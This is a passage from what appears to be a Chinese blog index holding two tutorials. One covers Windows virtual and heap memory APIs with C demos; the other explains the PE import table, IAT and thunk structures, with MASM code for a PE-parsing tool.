//指向要释放的内存区域的起始地址的指针 SIZE_T dwSize, //要释放的内存区域的大小，以字节为单位。 DWORD dwFreeType //自由操作的类型); Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/************************************** int main(void)* 功能 演示虚拟内存的使用** 参数 未使用**************************************/int main(void){ SIZE_T sizeVirtual = 4000; //大小 LPVOID lpRound = (LPVOID)0x100000FF; //地址 MEMORY_BASIC_INFORMATION mbi; //内存信息 //分配内存，直接分配已提交的内存 LPVOID lpAddress = VirtualAlloc( lpRound, sizeVirtual, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ); if (lpAddress == NULL) { printf(&quot;VirtualAlloc error: %d\\n&quot;, GetLastError()); return 1; } printf(&quot;Alloc:MEM_COMMIT|MEM_RESERVE\\n&quot;); //复制数据到内存中 CopyMemory(lpAddress, &quot;hello&quot;, lstrlen(&quot;hello&quot;)); printf(&quot;分配、复制成功，地址：0x%.8x，内容：%s\\n&quot;, lpAddress, lpAddress); //获取内存信息并打印 VirtualQuery(lpAddress, &amp;mbi, sizeof(mbi)); printf(&quot;使用VirtualQuery获得的信息：\\n&quot; &quot;BaseAddress:0x%.8x\\tAllocationBase:0x%.8x\\t&quot; &quot;AllocationProtect:0x%.8x\\tRegionSize:%u\\t&quot; &quot;State:0x%.8x\\tProtect:0x%.8x\\tType:0x%.8x\\n&quot;, mbi.BaseAddress, mbi.AllocationBase, mbi.AllocationProtect, mbi.RegionSize, mbi.State, mbi.Protect, mbi.Type ); ////设置为READ-ONLY属性 //if(!VirtualProtect(lpAddress,0,PAGE_READONLY,NULL)) //{ // printf(&quot;VirtualProtect error: %d&quot;,GetLastError()); // return 1; //} ////测试READ-ONLY属性,异常 //CopyMemory(lpAddress,&quot;read only&quot;,lstrlen(&quot;read only&quot;)); //printf(lpAddress); ////获取内存信息并打印 //VirtualQuery(lpAddress,&amp;mbi,sizeof(mbi)); //printf(&quot;使用VirtualQuery获得的信息：\\n&quot; // &quot;BaseAddress:0x%.8x\\tAllocationBase:0x%.8x\\t&quot; // &quot;AllocationProtect:0x%.8x\\tRegionSize:%d\\t&quot; // &quot;State:0x%.8x\\tProtect:0x%.8x\\tType:0x%.8x\\n&quot;, // mbi.BaseAddress,mbi.AllocationBase, // mbi.AllocationProtect,mbi.RegionSize, // mbi.State,mbi.Protect,mbi.Type // ); //DECOMMIT释放，页面将变为保留状态 printf(&quot;Free: DECOMMIT\\n&quot;); if (!VirtualFree(lpRound, sizeVirtual, MEM_DECOMMIT)) { printf(&quot;VirtualFree error: %d&quot;, GetLastError()); return 1; } //获取内存信息并打印 VirtualQuery(lpAddress, &amp;mbi, sizeof(mbi)); printf(&quot;使用VirtualQuery获得的信息：\\n&quot; &quot;BaseAddress:0x%.8x\\tAllocationBase:0x%.8x\\t&quot; &quot;AllocationProtect:0x%.8x\\tRegionSize:%u\\t&quot; &quot;State:0x%.8x\\tProtect:0x%.8x\\tType:0x%.8x\\n&quot;, mbi.BaseAddress, mbi.AllocationBase, mbi.AllocationProtect, mbi.RegionSize, mbi.State, mbi.Protect, mbi.Type ); //释放内存 printf(&quot;Free:RELEASE\\n&quot;); if (!VirtualFree(lpAddress, 0, MEM_RELEASE)) { printf(&quot;VirtualFree error: %d&quot;, GetLastError()); return 1; } return 0;} 修改内存页面状态和保护属性VirtualProtect改变指定虚拟内存分页得保护属性 123456BOOL VirtualProtect( LPVOID lpAddress, //虚拟内存基地址 SIZE_T dwSize, //内存大小 DWORD flNewProtect, //需要设置得新的属性 PDWORD lpflOldProtect //指向保存原属性值得DWORD变量，可以为NULL); VirtualLock1234BOOL VirtualLock( LPVOID lpAddress, //指向要锁定的页面区域的基地址的指针 SIZE_T dwSize //要锁定的区域的大小，以字节为单位); VirtualUnLock1234BOOL VirtualUnlock( LPVOID lpAddress, //指向要解锁的页面区域的基地址的指针 SIZE_T dwSize //要解锁的区域的大小，以字节为单位); Demo1 内存操作与内部信息管理复制、填充、移动、清零内存块、防止缓冲区CopyMemory复制内存，第一个参数为目的地址，第二个参数为源地址，第三个参数为复制数据得大小 12345void CopyMemory( _In_ PVOID Destination, //目的地址 _In_ const VOID *Source, //源地址 _In_ SIZE_T Length //大小长度); FileMemory12345void FillMemory( [out] PVOID Destination, //需要填充得内存地址 [in] SIZE_T Length, //填充得大小 [in] BYTE Fill //填充得值); MoveMemory12345void MoveMemory( _In_ PVOID Destination, //需要复制得目的地址 _In_ const VOID *Source, //源地址 _In_ SIZE_T Length //复制数据得大小); ZeroMemory1234 void ZeroMemory( [in] PVOID Destination, //内存地址 [in] SIZE_T Length //内存区域大小); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/* 常量定义 */#define MEM_BLOCK_MAX_SIZE 32/************************************** BOOL ShowMemContent(LPVOID lpMem,SIZE_T dwSize)* 功能 显示内存中的内容** 参数 LPVOID lpMem 需要显示的内存指针* SIZE_T dwSize 大小** 返回值 BOOL 如果数据过大可能溢出，则返回FALSE。**************************************/BOOL ShowMemContent(LPVOID lpMem, SIZE_T dwSize){ BYTE lpShow[MEM_BLOCK_MAX_SIZE]; INT i = 0; //防止栈溢出 if (dwSize&gt;MEM_BLOCK_MAX_SIZE) { printf(&quot;over-flow&quot;); return FALSE; } //复制到数组 CopyMemory((LPVOID)lpShow, lpMem, dwSize); //显示 for (; i&lt;dwSize; i++) { printf(&quot;%.2X &quot;, lpShow[i]); if (!((i + 1) % 16)) { printf(&quot;\\n&quot;); } } printf(&quot;\\n&quot;); return TRUE;}/************************************** int main(void)* 功能 获取内存使用情况** 参数 未使用**************************************/int main(void){ HANDLE hHeap = GetProcessHeap(); LPVOID lpSrc; LPVOID lpDis; //分配内存 lpSrc = HeapAlloc(hHeap, 0, MEM_BLOCK_MAX_SIZE); lpDis = HeapAlloc(hHeap, 0, MEM_BLOCK_MAX_SIZE); //显示新分配的内存 printf(&quot;HeapAlloc 分配但不清零：\\n&quot;); ShowMemContent(lpDis, MEM_BLOCK_MAX_SIZE); //将内存清零并显示 ZeroMemory(lpDis, MEM_BLOCK_MAX_SIZE); printf(&quot;ZeroMemory 清零：\\n&quot;); ShowMemContent(lpDis, MEM_BLOCK_MAX_SIZE); //使用0xBB填充全部内存 FillMemory(lpSrc, MEM_BLOCK_MAX_SIZE, 0xBB); //将内存块的前半部分使用0xAA填充 FillMemory(lpSrc, MEM_BLOCK_MAX_SIZE / 2, 0xAA); CopyMemory(lpDis, lpSrc, MEM_BLOCK_MAX_SIZE); printf(&quot;FillMemory 有规律的填充内存：\\n&quot;); ShowMemContent(lpDis, MEM_BLOCK_MAX_SIZE); //释放内存 HeapFree(hHeap, 0, lpSrc); HeapFree(hHeap, 0, lpDis); return 0;} 获取当前系统内存使用情况GlobalMemoryStatus123void GlobalMemoryStatus( LPMEMORYSTATUS lpBuffer //指向MEMORYSTATUSEX结构，用来保存获取得信息); GlobalMemoryStatusEx123void GlobalMemoryStatusEx( LPMEMORYSTATUS lpBuffer //指向MEMORYSTATUSEX结构，用来保存获取得信息); Demo12345678910111213141516171819202122232425262728/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/************************************** int main(void)* 功能 获取内存使用情况** 参数 未使用**************************************/int main(void){ //用于保存信息 MEMORYSTATUSEX memstatusex; //设置结构大小 memstatusex.dwLength = sizeof(memstatusex); //获取系统内存使用情况 GlobalMemoryStatusEx(&amp;memstatusex); //打印输入结果 printf(&quot;TotalPhys\\tAvailPhys\\tTotalVirtual\\tAvailVirtual\\t&quot; &quot;TotalPageFile\\tuAvailPageFile\\tMemoryLoad\\n&quot; &quot;%I64u\\t%I64u\\t%I64u\\t%I64u\\t%I64u\\t%I64u\\t%u%%&quot;, memstatusex.ullTotalPhys,memstatusex.ullAvailPhys, memstatusex.ullTotalVirtual,memstatusex.ullAvailVirtual, memstatusex.ullTotalPageFile,memstatusex.ullAvailPageFile, memstatusex.dwMemoryLoad); return 0;} 判断内存指针得可用性LsBadCodePtr判断进程是否拥有堆指定地址内存得读操作权限 123BOOL LsBadCodePtr( FARPROC lpfn //指向某指定地址); LsBadReadPtr判断调用进程是否拥有对指定地址段内存得读操作 1234BOOL LsBadReadPtr( const void* lp, //指向起始内存地址 UINT ucb //从其内存地址开始得内存块长度) LsBadStringPtr判断调用进程是否拥有对指定字符串指针得读取权限 1234BOOL LsBadStringPtr( LPCTSTR lpsz, //指向字符串 UINT_PTR ucchMax //读取字符串最大长度) LsBadWritePtr判断调用进程是否拥有对指定地址段内存得写操作权限 1234BOOL LsBadWritePtr( LPVOID lp, //起始得内存地址 UINT ucb //从起始地址开始得内存块长度)","link":"/2019/12/10/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"title":"PE权威指南-PE导入表","text":"导入是PE数据组织中的一个重要组成部分，它是为实现代码重用而设计的。通过分析导入表数据，可以获取诸如PE文件的指令调用了多少外来函数，这些外来函数在哪些动态链接库中。在数据目录中一共有四种类型的数据与导入表有关。这四种数据依此为： 导入表 导入函数地址表 绑定导入表 延迟加载导入表 何谓导入表Hello.asm源程序： 123456789101112131415161718192021222324 .386 .model flat,stdcall option casemap:none include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib .dataszCaption db 'A MessageBox !',0szText db 'Hello, World !',0 .codestart: invoke MessageBox,NULL,offset szText,offset szCaption,MB_OK invoke ExitProcess,NULL ;以上是两句调用语句 end start 当程序调用了动态链接库的相关的函数，在进行编译和链接的时候，编译程序和链接程序就会将调用的相关信息写入最终生成的PE文件中，以告诉操作系统这些函数的执行执行字节码从哪里获取。 导入函数invoke指令调用用户自定义函数，或者从其他动态链接库中导入的函数。 invoke指令分解连接器会对invoke指令进行分解。分解过后的指令将会包含指向导入函数的地址的操作数。当PE文件被装载到内存的时候，该操作数就变成导入函数所在虚拟地址空间的真实的VA 1234567891011121300401000 &gt;/$ 6A 00 push 0x0 ; /Style = MB_OK|MB_APPLMODAL00401002 |. 68 00304000 push Hello.00403000 ; |Title = &quot;A MessageBox !&quot;00401007 |. 68 0F304000 push Hello.0040300F ; |Text = &quot;Hello, World !&quot;0040100C |. 6A 00 push 0x0 ; |hOwner = NULL0040100E |. E8 07000000 call &lt;jmp.&amp;user32.MessageBoxA&gt; ; \\MessageBoxA00401013 |. 6A 00 push 0x0 ; /ExitCode = 0x000401015 \\. E8 06000000 call &lt;jmp.&amp;kernel32.ExitProcess&gt; ; \\ExitProcess0040101A $- FF25 08204000 jmp dword ptr ds:[&lt;&amp;user32.MessageB&gt;; user32.MessageBoxA00401020 .- FF25 00204000 jmp dword ptr ds:[&lt;&amp;kernel32.ExitPr&gt;; kernel32.ExitProcess00401026 00 db 0000401027 00 db 00 第一个调用语句被解释器解释为从地址0x00401000到0x0040100B反汇编代码。还有两处call，也是跳转语句。 文件偏移地址0x400处是代码段，其中存放程序指令。 装载前文件中的代码段字节如下： 可以看到，装载前文件中和装载后内存中的指令字节码是完全一样的。 invoke指令实施分解： 压栈，将要调用的所有参数全部压入栈中。压栈的时候按照先推后参数，所以一个进入栈中的数据是MB_OK，最后一个是NULL。 段内调用。通过指令call调用一个段内地址。 无条件跳转。jmp指令 导入函数地址虚拟地址VA，相对虚拟地址RVA 导入函数是从动态链接库引入的函数，所以，导入函数的地址位于被加载的进程地址空间中相应的动态链接库模块内。 这个是导入表在文件中的： 以下是内存中获取的导入表相关数据： 在文件0x0608中，内存0x00402008处，内存映像中的值是77D507EAh（h代表16进制），而文件中此处的值为0000025ch。这意味着，文件被装载到内存后，这里的值发生了变化，真正表示MessageBoxA函数地址的应该是内存中此处的值。 文件中的值，它是相对虚拟地址。 使用一个工具查看： name：节的名称 vitr：未对齐前节的长度 virt Address：内存中的偏移（对齐后的） 计算的方法： 0000205Ch是在.rdata节中，因为节.rdata的真实数据范围是00002000h~00002092h，而提供的值恰好在这个范围。 偏移地址offset1 = 0000250ch-00002000h=005ch 计算在文件中的偏移RAV = 0600+005ch=065ch 查看065c处的值，发现是019Dh+字符串‘MessageBoxA’，前者是一个编号(hint)，后者是调用的函数名(name)。 在将PE文件装载进入内存时，Windows会根据以下指令中的地址找到00401018处 1call 00401018 此处是一个跳转指令： 1jmp DOWRD PTR:DS:[00402008] 加载器继续查找相应位置0x00402008得到值0000205c处，然后从文件的0x0000250c处获取函数名MessageBoxA和函数在动态链接库里的编号。 加载器会根据函数的Hint（标号）/Name（名字）从内存地址中查找函数的VA为77d507eah，并将找到的函数地址覆盖内存0x00402008这个位置 当程序真正的被载入内容以后，0x00402008这个函数位置就已经被提交成函数的正确的虚拟地址了。 导入函数宿主操作系统会在加载时根据导入表的描述将调用的函数指令字节码负值到进程地址空间中。 事实上，操作系统会将该函数所处的所有动态链接库全部负值到进程地址空间，这些动态链接库便是导入函数的指令宿主。 为了节约内存，操作系统只保留有一个代码在物理内存中，大家看到的都在每个进程中加载的不同地址的动态链接库，只是在页面存取机制下的一个映射。 user32.dll链接库中MessageBoxA函数的源字节码： 1234567891011121314151677D507EA &gt; 8BFF mov edi,edi77D507EC 55 push ebp77D507ED 8BEC mov ebp,esp77D507EF 833D BC14D777 0&gt;cmp dword ptr ds:[0x77D714BC],0x077D507F6 74 24 je short user32.77D5081C77D507F8 64:A1 18000000 mov eax,dword ptr fs:[0x18]77D507FE 6A 00 push 0x077D50800 FF70 24 push dword ptr ds:[eax+0x24]77D50803 68 241BD777 push user32.77D71B2477D50808 FF15 C412D177 call dword ptr ds:[&lt;&amp;KERNEL32.Interlocke&gt;; kernel32.InterlockedCompareExchange77D5080E 85C0 test eax,eax77D50810 75 0A jnz short user32.77D5081C77D50812 C705 201BD777 0&gt;mov dword ptr ds:[0x77D71B20],0x177D5081C 6A 00 push 0x0 查看user32.dll模块的内存分配 虚拟地址空间的0x77D10000处于user32的文件投；而user32的代码段范围是0x77D11000~0x77D71000，所以说跳转指令的地址0x0077d507EA恰好在user32.dll的代码段单位中 查看User32.dll的信息 使用PEdump查看user32.dll的代码段的字节码 在OD中打开Hello,然后命令，输入d 77d11000然后回车，显示如下： 编译程序在编译汇编语言源文件的时候，会把程序中的invoke语句分解成三部分： 将参数压入栈 call指令 jmp指令 call的操作数是jmp指令所在的地址；而jmp指令的操作数则是该导入函数在导入表的地址 PE中的导入表导入表定位 红框部分为数据目录表中的导入表项，下方加框部分为导入函数地址表项目 可以得到如下信息： 导入表数据所在地址RAV = 0x000002010 导入表数据大小0000003C 导入函数地址表数据所在地址RAV = 0x0000002000 导入函数地址表数据大小00000010 使用PEinfo查看所有节的信息： 根据RVA与FOA的换算关系： IAT数据所在文件的偏移地址0x00000600 导入表数据所在文件的偏移地址0x00000610 其中下划线部分是导入表数据，共60字节。 0x00000600~0x00000610处为IAT数据，共16字节 导入表描述符导入表数据的起始是一组导入表描述符结构。每个20个字节，例子中60个字节的导入表数据被分为3组。前两组为动态链接库，最后一组为全0结构，表示导入表描述符已经结束。 Windows在查找导入表的时候并不一定要求最后一组的20个字节都是0，只要其中的字段Name1是0就已经满足结束条件了。 1234567891011121314IMAGE_IMPORT_DESCRIPORT STRUCT{ union { Characteristices dd ? OriginalFirstThunk dd ? ;0000h 桥1 } ends TimeDateSramp dd ? ;0004h时间戳 ForwarderChain dd ? ;0008h链表的前一个结构 Name1 dd ? ;000ch指向链接库名字的指针 FirstThunk dd ? ;0010h桥2 }IMAGE_IMPORT_DESCRIPORT ENDS OriginalFirstThunk该字段指向一个包含了一些列数据结构的数组。 指向的数组中每个结构定义了一个导入函数的信息，最后以一个内容为全0的结构作为结束。指向的数组每一项为一个结构，此结构名称是IMAGE_THUNK_DATA。该结构实际上只是一个双子，但在不同的时刻却有不同的解释。 双字最高位为0，导入符号是一个数值，该数值是一个RAV 双字最高位为1，导入符号是一个名称 TimeDateSramp时间戳，一般不用，多为0。如果该导入表项被绑定过，那么绑定后的这个时间戳就被设置为相对应的DLL文件的时间戳。操作系统加载时，可以通过这个时间戳来判断绑定的时间是否过时。 ForwarderChain双字，链表的前一个结构。 Name1双字，这个字段的名称其实是一个RAV，它指向该结构所对应的DLL文件的名称，而这个名称是以’\\0’结尾的Ansi字符串 FirstThunk双字，它指向这个链表定义了指针Name1这个动态链接库所引入的所有导入函数，简称桥2 导入表的双桥结构桥1和桥2最终通向了同一个目的地，都指向了引入函数的“标号-名称”(Hint/Name)描述部分，而从桥2到目的地的过程中，还经过了一个IAT。 导入表详细解析： 桥1，最高位为0，这是一个RAV，表明函数是以字符类型的函数名导入的。将RAV转换为FOA，从文件位置开始读取，直接取出双字”0”结束。 12345678IMAGE_THUNK_DATA struct union u1 ForwarderString dd ? Function dd ? Ordinal dd ? AddressOfData dd ? endsIMAGE_THUNK_DATA ENDS 连续取出的数分别为： 这组数中每一个都是一个RAV，不过这个RAV却指向了另外一个结构IMAGE_IMPORT_BY_NAME。这个结构大小不确定，是桥1最终的目的地。 从文件偏移0x0000065C开始的数据直到”0”结束 详细描述如下： 1234IMAGE_IMPORT_BY_NAME struct Hint dw ? ;函数编号 Name1 db ? ;函数名的字符串IMAGE_IMPORT_BY_NAME ENDS Hint双字，函数的编号，在DLL中对每个函数都进行了编号，访问函数时可以通过名称访问，也可以通过编号访问 Name1大小不确定，函数名字符串的具体内容，以”\\0”结尾。 时间戳，这里为0 链表的前一个结构，这里为0 RAV，这里指向动态链接库user32.dll的名字字符串 桥2 每一个结构IMAGE_INPORT_DESCRIPORT都对应一个唯一的动态链接库文件，以及引用了该动态链接库的多个函数，每个函数的最终”值-名称”描述均可以沿着桥1或者桥2找到，这种导入表结构被称为双桥结构 单桥的导入表是无法执行绑定导入操作的 导入函数地址表PE文件中所有导入函数jmp指令操作数的集合，组成了另外一个数据结构，这个就是导入函数地址表（IAT）。 导入函数地址表是一个双字的数组，每个双字代表的是一个导入函数的AV，该地址称为导入函数地址（IA）。 通过桥2即可定位到IAT，在内存中，桥1可以找到调用的函数名称或函数的索引编号，桥2可以帮助找到函数指令代码在内存空间中的地址。 当PE文件被加载到虚拟地址孔家你以后，IAT的内容会被操作系统修改为函数的VA。 构造调用同一个DLL文件的多个函数的导入表使用PEinfo查看 程序中共使用了user32.dll的三个API函数，依次为EnableWindow、FindWindow、ShowWindow 桥1，最高位为0，表示这是一个RAV，表示函数是以字符串类型的函数名导入的。 从0x0000065C处取出的值应该是一组IMAGE_THUNK_DATA，一直找到双字0为止 取出的这些IMAGE_THUNK_DATA结构依此是： 前三个RAV分别指向了IMAGE_IMPORT_BY_NAME结构，代表调用的三个函数： 指向user32.dll\\0字符串 桥2分析法： 定位导入函数地址表的两种方法： 从导入表的最后一个导入项IMAGE_IMPORT_DESCRIPORT结构中的字段IMAGE_IMPORT_DESCRIPORT.FirstThunk定位IAT 通过数据目录第13个数据项的描述直接定位IAT 如图所示： 导入表编程导入表遍历的思路 将导入表的第一个IMAGE_IMPORT_DESCRIPTOR的起始地址给edi 获取导入表所处节的名称，并显示 构造循环条件，当IMAGE_IMPORT_DESCRIPTOR结构中所有的字段均不为0作为执行条件 获取IMAGE_IMPORT_DESCRIPTOR结构所有字段，并显示该结构对应的动态链接库的名称 显示动态连哭下调用的所有函数的名称和编号 编写函数 __getlmportInfo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777.386.model flat,stdcalloption casemap:noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude comdlg32.incincludelib comdlg32.libICO_MAIN equ 1000DLG_MAIN equ 1000IDC_INFO equ 1001IDM_MAIN equ 2000IDM_OPEN equ 2001IDM_EXIT equ 2002IDM_1 equ 4000IDM_2 equ 4001IDM_3 equ 4002.datahInstance dd ?hRichEdit dd ?hWinMain dd ?hWinEdit dd ?szFileName db MAX_PATH dup(?).constszDllEdit db 'RichEd20.dll',0szClassEdit db 'RichEdit20A',0szFont db '宋体',0szExtPe db 'PE File',0,'*.exe;*.dll;*.scr;*.fon;*.drv',0 db 'All Files(*.*)',0,'*.*',0,0szErr db '文件格式错误!',0szErrFormat db '这个文件不是PE格式的文件!',0szSuccess db '恭喜你，程序执行到这里是成功的。',0szNotFound db '无法查找',0szMsg db '文件名：%s',0dh,0ah db '-----------------------------------------',0dh,0ah,0dh,0ah,0dh,0ah db '运行平台： 0x%04x (014c:Intel 386 014dh:Intel 486 014eh:Intel 586)',0dh,0ah db '节的数量： %d',0dh,0ah db '文件属性： 0x%04x (大尾-禁止多处理器-DLL-系统文件-禁止网络运行-禁止优盘运行-无调试-32位-小尾-X-X-X-无符号-无行-可执行-无重定位)',0dh,0ah db '建议装入基地址： 0x%08x',0dh,0ah db '文件执行入口(RVA地址)： 0x%04x',0dh,0ah,0dh,0ah,0szMsgSec db '---------------------------------------------------------------------------------',0dh,0ah db '节的属性参考：',0dh,0ah db ' 00000020h 包含代码',0dh,0ah db ' 00000040h 包含已经初始化的数据，如.const',0dh,0ah db ' 00000080h 包含未初始化数据，如 .data?',0dh,0ah db ' 02000000h 数据在进程开始以后被丢弃，如.reloc',0dh,0ah db ' 04000000h 节中数据不经过缓存',0dh,0ah db ' 08000000h 节中数据不会被交换到磁盘',0dh,0ah db ' 10000000h 数据将被不同进程共享',0dh,0ah db ' 20000000h 可执行',0dh,0ah db ' 40000000h 可读',0dh,0ah db ' 80000000h 可写',0dh,0ah db '常见的代码节一般为：60000020h,数据节一般为：c0000040h，常量节一般为：40000040h',0dh,0ah db '---------------------------------------------------------------------------------',0dh,0ah,0dh,0ah,0dh,0ah db '节的名称 未对齐前真实长度 内存中的偏移(对齐后的) 文件中对齐后的长度 文件中的偏移 节的属性',0dh,0ah db '---------------------------------------------------------------------------------------------',0dh,0ah,0szFmtSec db '%s %08x %08x %08x %08x %08x',0dh,0ah,0dh,0ah,0dh,0ah,0szMsg1 db 0dh,0ah,0dh,0ah,0dh,0ah db '---------------------------------------------------------------------------------------------',0dh,0ah db '导入表所处的节：%s',0dh,0ah db '---------------------------------------------------------------------------------------------',0dh,0ah,0szMsgImport db 0dh,0ah,0dh,0ah db '导入库：%s',0dh,0ah db '-----------------------------',0dh,0ah,0dh,0ah db 'OriginalFirstThunk %08x',0dh,0ah db 'TimeDateStamp %08x',0dh,0ah db 'ForwarderChain %08x',0dh,0ah db 'FirstThunk %08x',0dh,0ah db '-----------------------------',0dh,0ah,0dh,0ah,0szMsg2 db '%08u %s',0dh,0ah,0szMsg3 db '%08u(无函数名，按序号导入)',0dh,0ah,0szErrNoImport db 0dh,0ah,0dh,0ah db '未发现该文件有导入函数',0dh,0ah,0dh,0ah,0szMsgExport db 0dh,0ah,0dh,0ah,0dh,0ah db '---------------------------------------------------------------------------------------------',0dh,0ah db '导出表所处的节：%s',0dh,0ah db '---------------------------------------------------------------------------------------------',0dh,0ah db '原始文件名：%s',0dh,0ah db 'nBase %08x',0dh,0ah db 'NumberOfFunctions %08x',0dh,0ah db 'NuberOfNames %08x',0dh,0ah db 'AddressOfFunctions %08x',0dh,0ah db 'AddressOfNames %08x',0dh,0ah db 'AddressOfNameOrd %08x',0dh,0ah db '-------------------------------------',0dh,0ah,0dh,0ah db '导出序号 虚拟地址 导出函数名称',0dh,0ah db '-------------------------------------',0dh,0ah,0szMsg4 db '%08x %08x %s',0dh,0ah,0szExportByOrd db '(按照序号导出)',0szErrNoExport db 0dh,0ah,0dh,0ah db '未发现该文件有导出函数',0dh,0ah,0dh,0ah,0szMsgReloc1 db 0dh,0ah,'重定位表所处的节：%s',0dh,0ah,0szMsgReloc2 db 0dh,0ah db '--------------------------------------------------------------------------------------------',0dh,0ah db '重定位基地址： %08x',0dh,0ah db '重定位项数量： %d',0dh,0ah db '--------------------------------------------------------------------------------------------',0dh,0ah db '需要重定位的地址列表(ffffffff表示对齐用,不需要重定位)',0dh,0ah db '--------------------------------------------------------------------------------------------',0dh,0ah,0szMsgReloc3 db '%08x ',0szCrLf db 0dh,0ah,0szMsgReloc4 db 0dh,0ah,'未发现该文件有重定位信息.',0dh,0ah,0.code;----------------;初始化窗口程序;----------------_init proc local @stCf:CHARFORMAT invoke GetDlgItem,hWinMain,IDC_INFO mov hWinEdit,eax invoke LoadIcon,hInstance,ICO_MAIN invoke SendMessage,hWinMain,WM_SETICON,ICON_BIG,eax ;为窗口设置图标 invoke SendMessage,hWinEdit,EM_SETTEXTMODE,TM_PLAINTEXT,0 ;设置编辑控件 invoke RtlZeroMemory,addr @stCf,sizeof @stCf mov @stCf.cbSize,sizeof @stCf mov @stCf.yHeight,9*20 mov @stCf.dwMask,CFM_FACE or CFM_SIZE or CFM_BOLD invoke lstrcpy,addr @stCf.szFaceName,addr szFont invoke SendMessage,hWinEdit,EM_SETCHARFORMAT,0,addr @stCf invoke SendMessage,hWinEdit,EM_EXLIMITTEXT,0,-1 ret_init endp;------------------; 错误Handler;------------------_Handler proc _lpExceptionRecord,_lpSEH,\\ _lpContext,_lpDispathcerContext pushad mov esi,_lpExceptionRecord mov edi,_lpContext assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT mov eax,_lpSEH push [eax+0ch] pop [edi].regEbp push [eax+8] pop [edi].regEip push eax pop [edi].regEsp assume esi:nothing,edi:nothing popad mov eax,ExceptionContinueExecution ret_Handler endp;---------------------------------; 将内存偏移量RVA转换为文件偏移; lp_FileHead为文件头的起始地址; _dwRVA为给定的RVA地址;---------------------------------_RVAToOffset proc _lpFileHead,_dwRVA local @dwReturn pushad mov esi,_lpFileHead assume esi:ptr IMAGE_DOS_HEADER add esi,[esi].e_lfanew assume esi:ptr IMAGE_NT_HEADERS mov edi,_dwRVA mov edx,esi add edx,sizeof IMAGE_NT_HEADERS assume edx:ptr IMAGE_SECTION_HEADER movzx ecx,[esi].FileHeader.NumberOfSections ;遍历节表 .repeat mov eax,[edx].VirtualAddress ;计算该节结束RVA，不用Misc的主要原因是有些段的Misc值是错误的！ add eax,[edx].SizeOfRawData .if (edi&gt;=[edx].VirtualAddress)&amp;&amp;(edi&lt;eax) mov eax,[edx].VirtualAddress ;计算RVA在节中的偏移 sub edi,eax mov eax,[edx].PointerToRawData ;加上节在文件中的的起始位置 add eax,edi jmp @F .endif add edx,sizeof IMAGE_SECTION_HEADER .untilcxz assume edx:nothing assume esi:nothing mov eax,-1@@: mov @dwReturn,eax popad mov eax,@dwReturn ret_RVAToOffset endp;-------------------------------------------; 将距离文件头的文件偏移转换为内存偏移量RVA; lp_FileHead为文件头的起始地址; _dwOffset为给定的文件偏移地址;-------------------------------------------_OffsetToRVA proc _lpFileHead,_dwOffset local @dwReturn pushad mov esi,_lpFileHead assume esi:ptr IMAGE_DOS_HEADER add esi,[esi].e_lfanew assume esi:ptr IMAGE_NT_HEADERS mov edi,_dwOffset mov edx,esi add edx,sizeof IMAGE_NT_HEADERS assume edx:ptr IMAGE_SECTION_HEADER movzx ecx,[esi].FileHeader.NumberOfSections ;遍历节表 .repeat mov eax,[edx].PointerToRawData ;计算该节结束RVA，不用Misc的主要原因是有些段的Misc值是错误的！ add eax,[edx].SizeOfRawData .if (edi&gt;=[edx].PointerToRawData)&amp;&amp;(edi&lt;eax) mov eax,[edx].PointerToRawData ;计算RVA在节中的偏移 sub edi,eax mov eax,[edx].VirtualAddress ;加上节在文件中的的起始位置 add eax,edi jmp @F .endif add edx,sizeof IMAGE_SECTION_HEADER .untilcxz assume edx:nothing assume esi:nothing mov eax,-1@@: mov @dwReturn,eax popad mov eax,@dwReturn ret_OffsetToRVA endp;------------------------; 获取RVA所在节的名称;------------------------_getRVASectionName proc _lpFileHead,_dwRVA local @dwReturn pushad mov esi,_lpFileHead assume esi:ptr IMAGE_DOS_HEADER add esi,[esi].e_lfanew assume esi:ptr IMAGE_NT_HEADERS mov edi,_dwRVA mov edx,esi add edx,sizeof IMAGE_NT_HEADERS assume edx:ptr IMAGE_SECTION_HEADER movzx ecx,[esi].FileHeader.NumberOfSections ;遍历节表 .repeat mov eax,[edx].VirtualAddress add eax,[edx].SizeOfRawData ;计算该节结束RVA .if (edi&gt;=[edx].VirtualAddress)&amp;&amp;(edi&lt;eax) mov eax,edx jmp @F .endif add edx,sizeof IMAGE_SECTION_HEADER .untilcxz assume 